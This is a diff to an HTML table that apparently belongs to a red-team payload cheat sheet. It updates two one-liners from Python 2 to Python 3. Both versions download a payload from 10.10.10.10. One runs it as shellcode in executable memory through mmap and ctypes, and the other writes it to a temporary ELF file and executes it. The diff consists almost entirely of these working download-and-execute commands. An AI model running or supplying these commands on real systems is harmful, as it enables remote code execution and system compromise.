@@ -136,15 +136,15 @@ https://paper.bobylive.com/Security/The_Red_Team_Guide_by_Peerlyst_community.pdf
     </td>
   </tr>
   <tr>
-    <td>Python2 Shellcode Execution</td>
+    <td>Python3 Shellcode Execution</td>
     <td>
-      <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
+      <pre><code>/usr/bin/python3 -c 'import urllib.request,mmap,ctypes;d = urllib.request.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
     </td>
   </tr>
   <tr>
-    <td>Python2 Temp ELF Execution</td>
+    <td>Python3 Temp ELF Execution</td>
     <td>
-      <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
+      <pre><code>/usr/bin/python3 -c 'import os,urllib.request,tempfile;d=urllib.request.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0o755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
     </td>
   </tr>
 </table>
